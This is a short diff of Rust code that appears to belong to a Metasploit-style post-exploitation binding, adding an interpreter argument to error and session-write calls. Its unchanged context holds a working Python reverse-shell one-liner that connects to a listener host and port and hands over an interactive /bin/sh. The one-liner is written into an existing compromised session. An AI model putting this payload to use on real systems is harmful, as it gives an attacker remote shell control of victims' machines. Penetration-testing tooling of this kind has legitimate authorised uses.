     let port: u16 = lport
         .parse()
-        .map_err(|_| runtime_error("Invalid lport: must be a number between 1 and 65535"))?;
+        .map_err(|_| runtime_error(ruby, "Invalid lport: must be a number between 1 and 65535"))?;
     if port == 0 {
-        return Err(runtime_error("Invalid lport: must be between 1 and 65535"));
+        return Err(runtime_error(ruby, "Invalid lport: must be between 1 and 65535"));
     }
     let command = format!("python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", lhost, port);
-    msf_session_write(session_id, command)?;
+    msf_session_write(ruby, session_id, command)?;
     Ok(true)
 }
 
